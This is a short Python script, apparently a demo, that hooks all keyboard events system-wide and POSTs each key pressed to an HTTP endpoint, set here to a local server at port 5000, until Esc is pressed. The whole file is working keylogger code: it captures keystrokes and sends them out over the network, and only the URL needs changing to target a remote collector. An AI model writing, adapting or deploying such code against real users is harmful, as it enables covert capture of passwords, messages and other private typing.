import keyboard
import requests
import json

servidor_url = "http://localhost:5000/tecla"

def on_key_event(event):
    if event.event_type == keyboard.KEY_DOWN:
        tecla = event.name
        print(f"Enviando tecla: {tecla}")

        data = {'tecla':tecla}
        response = requests.post(servidor_url, json=data)
        
        if response.status_code == 200:
            print("Tecla enviada correctamente.")
        else:
            print(f"Error al enviar la tecla: {response.status_code}")


keyboard.hook(on_key_event)
keyboard.wait('esc')